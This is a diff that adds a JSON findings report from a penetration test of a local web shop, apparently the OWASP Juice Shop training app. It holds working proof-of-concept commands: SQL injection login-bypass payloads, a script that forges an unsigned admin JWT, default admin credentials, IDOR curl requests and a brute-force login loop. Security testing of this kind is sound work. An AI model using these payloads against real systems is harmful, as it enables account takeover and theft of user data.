@@ -1,0 +1,166 @@
+{
+  "engagement": {
+    "target": "http://localhost:3000",
+    "date": "2026-04-12",
+    "agent": "manual2",
+    "skills": [
+      "auth-bypass-testing",
+      "idor-testing",
+      "server-side"
+    ]
+  },
+  "summary": {
+    "total": 12,
+    "critical": 4,
+    "high": 7,
+    "medium": 1,
+    "low": 0,
+    "confirmed": 12
+  },
+  "findings": [
+    {
+      "id": "F-003",
+      "title": "SQL Injection Login Bypass → Admin Account Takeover",
+      "severity": "Critical",
+      "cvss_score": 9.8,
+      "cwe": "CWE-89",
+      "endpoint": "POST /rest/user/login",
+      "status": "CONFIRMED",
+      "evidence": "HTTP 200 with JWT token; decoded email=admin@juice-sh.op, role=admin",
+      "poc": "curl -s -X POST http://localhost:3000/rest/user/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"'\"'\"' OR 1=1--\",\"password\":\"x\"}'",
+      "timestamp": "2026-04-12T14:46:45.356786"
+    },
+    {
+      "id": "F-004",
+      "title": "JWT Algorithm Confusion (alg:none) → Admin Privilege Escalation",
+      "severity": "Critical",
+      "cvss_score": 9.1,
+      "cwe": "CWE-345",
+      "endpoint": "GET /api/Users/",
+      "status": "CONFIRMED",
+      "evidence": "HTTP 200 with forged alg:none token; returned 23 user records",
+      "poc": "# Forge token with alg:none\npython3 -c \"\nimport base64, json\nheader = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()\npayload = base64.b64encode(json.dumps({'data':{'email':'admin@juice-sh.op','role':'admin'}}).encode()).rstrip(b'=').decode()\nprint(f'{header}.{payload}.')\n\"\ncurl -H 'Authorization: Bearer <forged_token>' http://localhost:3000/api/Users/",
+      "timestamp": "2026-04-12T14:46:45.368038"
+    },
+    {
+      "id": "F-005",
+      "title": "Weak Default Credentials: admin@juice-sh.op:admin123",
+      "severity": "Critical",
+      "cvss_score": 9.8,
+      "cwe": "CWE-798",
+      "endpoint": "POST /rest/user/login",
+      "status": "CONFIRMED",
+      "evidence": "HTTP 200 - login succeeded with admin@juice-sh.op:admin123",
+      "poc": "curl -X POST http://localhost:3000/rest/user/login -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}'",
+      "timestamp": "2026-04-12T14:46:45.373085"
+    },
+    {
+      "id": "F-017",
+      "title": "SQL Injection in Product Search Endpoint",
+      "severity": "Critical",
+      "cvss_score": 9.8,
+      "cwe": "CWE-89",
+      "endpoint": "GET /rest/products/search?q=",
+      "status": "CONFIRMED",
+      "evidence": "Payload '')) OR 1=1--' → HTTP 200, 46 results",
+      "poc": "curl 'http://localhost:3000/rest/products/search?q=')) OR 1=1--'",
+      "timestamp": "2026-04-12T14:46:45.570842"
+    },
+    {
+      "id": "F-001",
+      "title": "Admin Application Config Exposed Without Authentication",
+      "severity": "High",
+      "cvss_score": 6.5,
+      "cwe": "CWE-306",
+      "endpoint": "GET /rest/admin/application-configuration",
+      "status": "CONFIRMED",
+      "evidence": "HTTP 200, domain=juice-sh.op",
+      "poc": "curl http://localhost:3000/rest/admin/application-configuration",
+      "timestamp": "2026-04-12T14:46:45.278704"
+    },
+    {
+      "id": "F-007",
+      "title": "IDOR: Cross-User Basket Access via Predictable ID",
+      "severity": "High",
+      "cvss_score": 7.5,
+      "cwe": "CWE-639",
+      "endpoint": "GET /rest/basket/{id}",
+      "status": "CONFIRMED",
+      "evidence": "HTTP 200; User1 (bid=6) accessed User2 basket (bid=7): {\"status\": \"success\", \"data\": {\"id\": 7, \"coupon\": null, \"UserId\": 24, \"createdAt\": \"2026-04-12T11:46:45.347Z\", \"updatedAt\": \"2026-04-12T11:46:45.347Z\", \"Products\": []}}",
+      "poc": "# Login as user1, get token\ncurl -H 'Authorization: Bearer <user1_token>' http://localhost:3000/rest/basket/7",
+      "timestamp": "2026-04-12T14:46:45.481617"
+    },
+    {
+      "id": "F-007b",
+      "title": "IDOR: Basket ID 1 Accessible by Any Authenticated User",
+      "severity": "High",
+      "cvss_score": 7.5,
+      "cwe": "CWE-639",
+      "endpoint": "GET /rest/basket/1",
+      "status": "CONFIRMED",
+      "evidence": "HTTP 200; own bid=6, accessed bid=1",
+      "poc": "curl -H 'Authorization: Bearer <token>' http://localhost:3000/rest/basket/1",
+      "timestamp": "2026-04-12T14:46:45.490021"
+    },
+    {
+      "id": "F-008",
+      "title": "IDOR: User Profile Access by Sequential ID (admin account exposed)",
+      "severity": "High",
+      "cvss_score": 6.5,
+      "cwe": "CWE-639",
+      "endpoint": "GET /api/Users/{id}",
+      "status": "CONFIRMED",
+      "evidence": "HTTP 200; accessed user id=1, email=admin@juice-sh.op",
+      "poc": "curl -H 'Authorization: Bearer <token>' http://localhost:3000/api/Users/1",
+      "timestamp": "2026-04-12T14:46:45.498851"
+    },
+    {
+      "id": "F-010",
+      "title": "BAC: Full User Database Accessible to Regular Users",
+      "severity": "High",
+      "cvss_score": 6.5,
+      "cwe": "CWE-285",
+      "endpoint": "GET /api/Users/",
+      "status": "CONFIRMED",
+      "evidence": "HTTP 200; 23 users returned with emails, hashed passwords, roles",
+      "poc": "curl -H 'Authorization: Bearer <user_token>' http://localhost:3000/api/Users/",
+      "timestamp": "2026-04-12T14:46:45.510991"
+    },
+    {
+      "id": "F-011",
+      "title": "BAC: FTP Directory Listing Exposed (sensitive files)",
+      "severity": "High",
+      "cvss_score": 7.5,
+      "cwe": "CWE-548",
+      "endpoint": "GET /ftp/",
+      "status": "CONFIRMED",
+      "evidence": "HTTP 200; directory listing accessible",
+      "poc": "curl http://localhost:3000/ftp/",
+      "timestamp": "2026-04-12T14:46:45.521352"
+    },
+    {
+      "id": "F-012",
+      "title": "BAC: Admin Panel Frontend Accessible to Regular Users",
+      "severity": "High",
+      "cvss_score": 8.1,
+      "cwe": "CWE-285",
+      "endpoint": "GET /administration",
+      "status": "CONFIRMED",
+      "evidence": "HTTP 200; admin panel rendered",
+      "poc": "curl -H 'Authorization: Bearer <user_token>' http://localhost:3000/administration",
+      "timestamp": "2026-04-12T14:46:45.526429"
+    },
+    {
+      "id": "F-006",
+      "title": "No Rate Limiting on Login Endpoint (Brute Force Possible)",
+      "severity": "Medium",
+      "cvss_score": 7.5,
+      "cwe": "CWE-307",
+      "endpoint": "POST /rest/user/login",
+      "status": "CONFIRMED",
+      "evidence": "15 consecutive failed attempts returned no 429 / lockout",
+      "poc": "for i in $(seq 1 100); do curl -s -X POST http://localhost:3000/rest/user/login -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"test$i\"}'; done",
+      "timestamp": "2026-04-12T14:46:45.468485"
+    }
+  ]
+}
